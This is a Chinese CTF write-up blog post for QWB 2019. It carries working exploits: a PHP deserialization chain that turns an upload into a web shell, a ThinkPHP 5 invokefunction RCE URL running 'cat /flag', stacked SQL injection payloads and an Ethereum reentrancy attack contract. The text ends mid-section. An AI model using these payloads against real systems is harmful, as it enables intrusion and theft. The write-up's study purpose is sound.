
<!DOCTYPE html>
<html lang="zh-Hans">
    <head>
        <title>QWB2019_writeup</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
<link rel="stylesheet", href="/./css/style.css">
<link rel="shortcut icon", href="/../../../../images/favicon.ico">
<link rel="apple-touch-icon", href="/./apple-touch-icon.png">

        
    
    <link rel='stylesheet' href="/./css/dracula.css">

    </head>
    <body>
        <header class="al_header al_pos_fixed">
    <div class="al_header_container dis_flex_jcenter">
        <div class="al_header_container_left">
            <div class="al_header_site_title">
                <a href="/">Altm4nz's blog</a>
            </div>
        </div>

        <div class="dis_flex_jcenter">
            <div class="al_header_setting">
                <svg class="al_header_icon">
                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
                </svg>
            </div>
        </div>
    </div>
</header>

        <div class="al_sidebar">

    <div class="al_sidebar_overlay al_full_cover"></div>

    <div class="al_pos_fixed al_sidebar_cnt">
        <div class="dis_flex_acenter al_sidebar_header">
            <h3>Altm4nz's blog</h3>
            <div class="al_sidebar_close al_header_setting">
                <svg class="al_header_icon">
                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
                </svg>
            </div>
        </div>

        <div class="al_sidebar_author_cnt">

            <div class="al_sidebar_author_info">
                
                <img class="al_sidebar_avatar" src="../../../../images/IMG_4178.JPG">
                <p></p>
                <h4>WEB划水选手</h4>
            </div>

            
        </div>
    </div>
</div>

        
    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
        <img class="al_lightbox_img"/>
    </div>
    <div class="al_page_background dis_flex_center al_full_cover"></div>
    <div class="al_page_container">
        <div class="al_pos_ab al_fake_background"></div>
        <div class="al_main_container al_shadow al_main_page_container">
            <article class="al_article">
                <header>
                    <h1 class="al_page_title">
                        QWB2019_writeup
                    </h1>
                    <div class="al_page_info dis_flex">
                        <div class="al_page_content_info">
                            May 28, 2019 05:05 AM
                        </div>

                        
                            <div class="al_page_content_info">
                                2.8k words
                            </div>
                        

                        
                            <div class="al_page_content_info">
                                13 minutes read
                            </div>
                            <div class="al_page_content_info">
                                本文总阅读量<span id="busuanzi_value_page_pv"></span>次
                            </div>
                        
                        <span class="tags"></span>
                    </div>
                </header>

                
                    <div class="al_page_content_outline">
                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-text">upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#审计分析"><span class="toc-text">审计分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始操作"><span class="toc-text">开始操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#高明的黑客"><span class="toc-text">高明的黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随便注"><span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#护网先锋上单"><span class="toc-text">护网先锋上单</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BABYBANK"><span class="toc-text">BABYBANK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babybet"><span class="toc-text">babybet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#强网先锋-辅助"><span class="toc-text">强网先锋_辅助</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#copperstudy"><span class="toc-text">copperstudy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge1"><span class="toc-text">challenge1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge2"><span class="toc-text">challenge2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge3"><span class="toc-text">challenge3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge4"><span class="toc-text">challenge4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge5"><span class="toc-text">challenge5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge6"><span class="toc-text">challenge6</span></a></li></ol></li></ol></li></ol>
                    </div>
                

                
                <section id="post-body">
                    <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><h3 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析"></a>审计分析</h3><p>先收集信息，找到源代码<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a><br>开始代码审计。每个控制器中都定义了类，尝试寻找反序列化的点。<br>在login中发现cookie的序列化过程</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (md5($password) === $user_info[<span class="string">'password'</span>]) &#123;</span><br><span class="line">                    $cookie_data=base64_encode(serialize($user_info));</span><br><span class="line">                    cookie(<span class="string">"user"</span>,$cookie_data,<span class="number">3600</span>);</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;success(<span class="string">'Login successful!'</span>, url(<span class="string">'../home'</span>));</span><br></pre></td></tr></table></figure>
<p>又在logincheck函数中发现了反序列化的点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>反序列话的参数可以控制，接下来寻找可用的类。<br>继续审计注意到Profile类中有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br></pre></td></tr></table></figure>
<p>在我们上传文件时，最终生成的文件是文件名的md5加上png后缀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>但是如果我们在不上传文件的情况下，既empty($_FILES)=1时调用upload_img()函数，就可以控制文件名后缀了。<br>下面构造攻击链<br>注意到register中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里调用了index()方法，那么我们可以用他来触发_call,<br>而Profile中的_call方法可以触发_get,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>而我们只要控制好except的值，就可以调用任意方法。</p>
<p>那么我们攻击链就很明显了</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">R<span class="function"><span class="title">egister</span>-&gt;</span>__destruct</span><br><span class="line">P<span class="function"><span class="title">rofile</span>-&gt;</span> __call</span><br><span class="line">P<span class="function"><span class="title">rofile</span>-&gt;</span> __get</span><br><span class="line">P<span class="function"><span class="title">rofile</span>-&gt;</span> upload_img()</span><br></pre></td></tr></table></figure>
<p>控制filename参数，讲我们上传的内容重命名后缀。<br>生成序列化脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;registed=<span class="number">0</span>;</span><br><span class="line">$a-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">$a-&gt;checker-&gt;ext=<span class="number">1</span>;</span><br><span class="line">$a-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/08856017fa6b6b422db719c5519123dc/da5402f0aef9e4efbb5a9c9bb8566e7b.png"</span>;</span><br><span class="line">$a-&gt;checker-&gt;filename=<span class="string">"./upload/altman.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>


<h3 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h3><p>先上传一个带有恶意代码的png图片上去，然后在源代码找到图片地址。<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.12.52.png" alt=""></p>
<p>然后讲cookie替换成生成的序列化数据<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.17.10.png" alt=""></p>
<p>刷新后访问首页。<br>之后再去访问刚才图片发现已经被删除了，访问altman.php后缀发现代码成功执行，getshell。然后根目录拿flag就行了。<br><img src="/2019/05/28/QWB2019-writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.22.03.png" alt=""><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.22.03.png" alt="屏幕快照 2019-05-27 上午11.22.03"></p>
<h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><p>下载源码拿到上千个混淆文件，每个文件又有许多参数。<br>猜测应该会有一个文件中有存在命令执行，尝试本地进行爆破<br>使用eval和system都能执行的命令echo来测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># -*- author:altman -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/web2/"</span></span><br><span class="line">rr = re.compile(<span class="string">r'(_GET\[\')(.*)(\'\])'</span>)</span><br><span class="line">cmd=<span class="string">"echo 66666;"</span></span><br><span class="line"></span><br><span class="line">file=os.listdir(<span class="string">'/Users/a1tm4nz/site/web2/'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">    url1 = <span class="string">"http://127.0.0.1/web2/"</span>+i</span><br><span class="line">    x=open(<span class="string">'/Users/a1tm4nz/site/web2/'</span>+i)</span><br><span class="line">    content=x.read()</span><br><span class="line">    get=rr.findall(content)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> get:</span><br><span class="line">        url2=url1+<span class="string">"?"</span>+j[<span class="number">1</span>]+<span class="string">"="</span>+cmd</span><br><span class="line">        r=requests.get(url=url2)</span><br><span class="line">        <span class="keyword">print</span> url2</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"66666"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"GET it"</span></span><br><span class="line">            <span class="keyword">print</span> url2</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<p>爆破了6分钟后果然找到了一个可以执行命令的地方<br><img src="/2019/05/28/QWB2019-writeup/15589297130459.jpg" alt=""></p>
<p>然后执行命令拿到flag<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.02.36.png" alt=""></p>
<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>随手测试发现过滤这些内容</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">", $inject);</span></span><br></pre></td></tr></table></figure>
<p>过滤了select和. 正常的注入思路基本行不通。<br>发现可以堆叠注入。<br>尝试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1%27;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
<p>得到表名<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.06.17.png" alt=""></p>
<p>又通过</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=<span class="number">1</span>%<span class="number">27</span>;show%<span class="number">20</span>create%<span class="number">20</span>table%<span class="number">20</span>`<span class="number">1919810931114514</span>`;</span><br></pre></td></tr></table></figure>
<p>得到表结构<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.07.49.png" alt=""></p>
<p>然后就卡住了很久。<br>发现没有过滤alter<br>因此可以通过修改表结构和表名的来让页面直接查询flag。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> xxx;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>此时把flag所在表改名成words，回到首页直接查询发现报错，缺少id字段。<br>重置环境，给表中加入id字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">add</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">1</span>);<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> xxx;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>再查询。<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.11.26.png" alt=""></p>
<h2 id="护网先锋上单"><a href="#护网先锋上单" class="headerlink" title="护网先锋上单"></a>护网先锋上单</h2><p>看log后便知是一个tp5.3 below命令执行<br>只用log中的poc去打就行了</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.23.26:31960/1/public/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=cat+/flag</span><br></pre></td></tr></table></figure>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="BABYBANK"><a href="#BABYBANK" class="headerlink" title="BABYBANK"></a>BABYBANK</h2><p>我们通过合约地址进行逆向得到合约的逆向代码(<a href="https://ethervm.io/decompile/" target="_blank" rel="noopener">https://ethervm.io/decompile/</a>)<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.29.46.png" alt=""></p>
<p>由代码分析我们得出代码中的关键函数分别为：guess、profit、transfer、withdraw。<br>且合约中存在两个关键变量：balance（余额）以及level（一种标记）。<br>在审计合约之后我们发现<br>profit函数：每个账户只允许调用一次，并发送钱包1 token；<br>guess函数需要level值为1且调用后余额+1、leve+1 ；<br>而transfer函数满足必须balance与level同时为2才能调用，且调用后收款方余额变为2，且转账方余额变为0 ；<br>withdraw函数表示取款，且合约会将以太币转给msg.sender。<br>然而漏洞点就在withdraw中。熟悉区块链的人都知道此处使用.call方法进行转账，而这种方法会调用收款方的fallback函数，从而引发重入攻击。<br>于是我们利用此来进行攻击。我们还看到withdraw中还存在如下方法：<br><img src="/2019/05/28/QWB2019-writeup/15589279018437.jpg" alt=""></p>
<p>当存在减法且没有判断时，我们就可以认定这里存在溢出，然而要满足溢出条件需要storage[temp2]&lt;temp1。可是前面代码加了判断，所以我们需要在中间调用.call时进行对余额的操作从而让其减小。<br>我们可以在合约调用如下句子的时候调用收款人的fallback函数从而再次执行withdraw，加入合约余额为2，转账金额设置为2。而在中间进行调用可以很好的绕过余额的检测，从而达成2-2-2的情况，从而溢出。<br>贴上攻击合约</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract hack&#123;</span><br><span class="line">	babybank a;</span><br><span class="line">	uint <span class="built_in">count</span> = <span class="number">0</span>;</span><br><span class="line">	event <span class="built_in">log</span>(uint256);</span><br><span class="line">	constructor(address b)<span class="keyword">public</span>&#123;</span><br><span class="line">        a = babybank(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> () <span class="keyword">public</span> payable &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">count</span>==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">log</span>(<span class="number">3</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">count</span> = <span class="built_in">count</span> + <span class="number">1</span>;</span><br><span class="line">      a.withdraw(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">log</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> getMoney() <span class="keyword">public</span> payable&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> hacker() <span class="keyword">public</span>&#123;</span><br><span class="line">    	a.withdraw(<span class="number">2</span>);</span><br><span class="line">    	<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> payforflag1(string md5ofteamtoken,string b64email) <span class="keyword">public</span>&#123;</span><br><span class="line">        a.payforflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> kill() &#123;</span><br><span class="line">   </span><br><span class="line">      selfdestruct(<span class="number">0</span>xd630cb8c3bbfd38d1880b8256ee06d168ee3859c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/05/28/QWB2019-writeup/15589280222995.jpg" alt="15589280222995"></p>
<p>1 由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。<br>2 进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。<br>3 当C有了2token便可以进行攻击，调用hacker函数即可。<br>PS：由于合约需要前四位为“b1b1”的账户，所以我们需要<a href="https://vanity-eth.tk/来生成相应的账户B。" target="_blank" rel="noopener">https://vanity-eth.tk/来生成相应的账户B。</a><br><img src="/2019/05/28/QWB2019-writeup/C6B56DE8FEB563045E51901442AA1380.jpg" alt=""></p>
<p>调动成功后在邮箱收到flag<br><img src="/2019/05/28/QWB2019-writeup/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.35.29.png" alt=""></p>
<h2 id="babybet"><a href="#babybet" class="headerlink" title="babybet"></a>babybet</h2><p>给了部分合约代码</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract babybet &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) <span class="keyword">public</span> balance;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) <span class="keyword">public</span> status;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span></span><br><span class="line">    <span class="comment">//Gmail is ok. 163 and qq may have some problems.</span></span><br><span class="line">    event sendflag(<span class="built_in">string</span> md5ofteamtoken,<span class="built_in">string</span> b64email); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        balance[msg.sender]=<span class="number">1000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//pay for flag</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">payforflag</span>(<span class="params"><span class="built_in">string</span> md5ofteamtoken,<span class="built_in">string</span> b64email</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balance[msg.sender] &gt;= <span class="number">1000000</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.sender!=owner)&#123;</span><br><span class="line">        balance[msg.sender]=<span class="number">0</span>;&#125;</span><br><span class="line">        owner.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>逆向合约，得到关键函数：profit、bet、func_048F（转账函数）。<br>发现此问题相比上一道题利用方法更为简单。首先调用profit函数获得空投10 token。<br>之后进入bet函数，而bet函数有如下判断：首先余额要&gt;=10 、status要小于2、传入的参数要与随机数相同，之后便会给与此账户1000代币，并将status改为2 。<br>于是我们的函数调用顺序为：创建新合约账户A，调用profit、预测随机数调用guess、调用转账函数汇总token。<br>合约要求代币要&gt;1000000，所以上述薅羊毛过程需要重复1000次，并汇总到一个账户中。<br>具体合约如下：</p>
